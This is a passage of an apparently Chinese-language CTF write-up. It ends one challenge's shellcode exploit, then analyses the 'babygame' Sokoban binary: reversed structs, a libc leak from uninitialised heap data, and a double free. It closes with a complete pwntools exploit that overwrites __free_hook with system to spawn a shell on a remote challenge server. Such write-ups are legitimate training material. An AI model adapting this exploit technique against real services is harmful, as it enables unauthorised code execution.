    shellcode += p32(0x03800893) + p32(0x00000073) + p16(0x8646)
    shellcode += p16(0x089d) + p32(0x00000073) + p16(0x4505) + p16(0x0885) + p32(0x00000073)
    payload += shellcode
    p.sendline(payload)
    p.interactive()
## babygame
程序实现了一个类似于迷宫的操作，提供了如下的几种功能
    h
         Sokoban
    How to Play:
        Push all boxs into target place
    Map:
        1)█:wall
        2)○:Target
        3)□:Box
        4)♀:Player
        5)●:Box on target
    Command:
        1)h: show this message
        2)q: quit the game
        3)w: move up
        4)s: move down
        5)a: move left
        6)d: move right
        7)b: move back
        8)m: leave message
        k)n: show name
        10)l: show message
目前逆向出的`game`结构体如下，其中`map`另有结构体存储。
    00000000 game            struc ; (sizeof=0x50, mappedto_7)
    00000000 map_vector_start dq ?
    00000008 current_vector  dq ?
    00000010 vector_end      dq ?
    00000018 start_time      dq ?
    00000020 end_time        dq ?
    00000028 cost_time       dq ?
    00000030 level           dd ?
    00000034 unknown         dd ?
    00000038 step_forward    db ?
    00000039 is_quit         db ?
    0000003A                 db ? ; undefined
    0000003B                 db ? ; undefined
    0000003C                 db ? ; undefined
    0000003D                 db ? ; undefined
    0000003E                 db ? ; undefined
    0000003F                 db ? ; undefined
    00000040 map             dq ?
    00000048 message         dq ?
    00000050 game            ends
程序的主要逻辑如下
    __int64 __usercall main@(__int64 a1@, char **a2@, char **a3@, unsigned int a4@)
    {
      __int64 v4; // rdi
      char v6; // [rsp+Eh] [rbp-2h]
      v6 = 1;
      while ( v6 )
      {
        game_func(a4);
        v4 = std::operator>(&std::cout, "restart?");
        std::ostream::operator>);
        if ( (unsigned __int8)get_input_filter(v4, &std::endl>) != 121 )
          v6 = 0;
      }
      return 0LL;
    }
    unsigned __int64 __usercall game_func@(unsigned int a1@)
    {
      unsigned __int64 result; // rax
      char v2; // [rsp+0h] [rbp-90h]
      unsigned __int64 v3; // [rsp+78h] [rbp-18h]
      v3 = __readfsqword(0x28u);
      init_game((game *)&v2, 0);
      game_start((game *)&v2, 0LL, a1);
      result = leave_name((__int64)&v2);
      __readfsqword(0x28u);
      return result;
    }
    void __usercall game_start(game *a1@, unsigned __int64 a2@, unsigned int a3@)
    {
      char num; // ST1F_1
      game *a1a; // [rsp+8h] [rbp-18h]
      a1a = a1;
      sub_FE91();
      a1->step_forward = 1;
      a1->level = -1;
      while ( !a1a->is_quit )
      {
        while ( a1a->level == -1 && !a1a->is_quit )
        {
          num = get_input((__int64)a1, (void *)a2);
          a2 = (unsigned int)num;
          a1 = a1a;
          detec_error_quit(a1a, num);
        }
        if ( a1a->is_quit )
          break;
        get_map(a1a);
        handle_step(a1a, a3);
        a1 = a1a;
        put_map_vector(a1a);
      }
      sub_FE98();
    }
    unsigned __int64 __fastcall leave_name(game *a1)
    {
      __int64 v1; // rdi
      __int64 v2; // rax
      game *v4; // [rsp+8h] [rbp-48h]
      __int64 name; // [rsp+20h] [rbp-30h]
      unsigned __int64 v6; // [rsp+48h] [rbp-8h]
      v4 = a1;
      v6 = __readfsqword(0x28u);
      v1 = std::operator>(&std::cout, "leave your name?");
      std::ostream::operator>);
      if ( (unsigned __int8)get_input_filter(v1, &std::endl>) == 'y' )
      {
        v2 = std::operator>(&std::cout, "your name:");
        std::ostream::operator>);
        std::__cxx11::basic_string,std::allocator>::basic_string(&name);
        std::getline,std::allocator>(&std::cin, &name);
        put_name_to_vector((game *)&::a1, (__int64)&name);
        std::__cxx11::basic_string,std::allocator>::~basic_string(&name, &name);
      }
      clear_map_vector(v4);
      operator delete((void *)v4->message);
      sub_C026(v4);
      return __readfsqword(0x28u) ^ v6;
    }
程序存在两个漏洞，一个是算是`message`脏数据。首先在`init_game`函数中为`game->message`分配空间的时候并没有清空内存中的数据，而`message`的堆块大小为`0x510`，也就是说释放之后重新申请即可以泄漏得到`libc`基址。程序恰好存在`restart`的情况，因此我们可以据此泄漏得到`libc`基址。
    send_level("q")
    send_order("n")
    send_order("y")
    send_level("l")
    p.recvuntil("message:")
    libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - 96 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc address is {}".format(hex(libc.address)))
另一个就是`map+0xe0`处保存指针的`double free`漏洞。该处的漏洞是在调试中发现的，在`update
level`之后会退出会出现一个`double free`的漏洞，堆块的大小是`0x60`。那么接下来就是`double
free`如何利用的问题了。我们能够进行任意堆块分配的就是`message`了。但是程序中采用的是`cin`进行读取的，不能覆盖到`0x60`的堆块。但是我们看到在读取得到`message`之后会将其`put
vector`。在该函数中会按照我们输入的`message`的长度进行堆块申请
    if ( current_vector_c )
      current_vector_c = std::__cxx11::basic_string,std::allocator>::basic_string(
        current_vector_c,
        name_c);
这里就达到了我们任意申请堆块的目的。下面就是正常的`double
free`的操作了。这里注意的是`put_name_vector`函数调用结束之后就是`name`的析构函数。
    put_name_to_vector((game *)&::a1, (__int64)&name);
    std::__cxx11::basic_string,std::allocator>::~basic_string(
    (__int64)&name,
    (__int64)&name);
在我们覆写完毕`free_hook`之后此处是第一次调用的位置（需要注意`name
vector`的扩展情况），因此我们将`name`的起始八个字节改为`/bin/sh`，覆写的`fd`指针自然变为`free_hook-0x8`。
    # encoding=utf-8
    from pwn import *
    file_path = "./pwn"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        # gdb.attach(p, "b *$rebase(0xB56b)\nb *$rebase(0xB166)\nb *$rebase(0xa70d)\nb *$rebase(0xb06f)")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    else:
        p = remote('52.152.231.198', 8082)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_gadget = 0x0
    def send_order(order):
        p.sendlineafter("Please input an order:\n", order)
    def send_level(level):
        p.sendlineafter("Please input an level from 1-9:\n", level)
    def leave_name(name):
        p.sendlineafter("your name:", name)
    send_level("q")
    send_order("n")
    send_order("y")
    send_level("l")
    p.recvuntil("message:")
    libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - 96 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc address is {}".format(hex(libc.address)))
    send_level("1")
    send_order("2")
    send_order("q")
    send_order("n")
    leave_name(b"a"*0x70) # name vector 1, ex
    send_order("y")
    send_level("1")
    send_order("q")
    send_order("y")
    leave_name(p64(libc.sym['__free_hook']- 0x8).ljust(0x50, b"\x00")) # name vector 2, ex
    send_order("y")
    send_level("1")
    send_order("q")
    send_order("y")
    leave_name(b"a"*0x50) # name vector 3, ex
    send_order("y")
    send_level("1")
    send_order("q")
    send_order("y")
    leave_name((b"/bin/sh\x00" + p64(libc.sym['system'])).ljust(0x50, b"\x00"))
    p.interactive()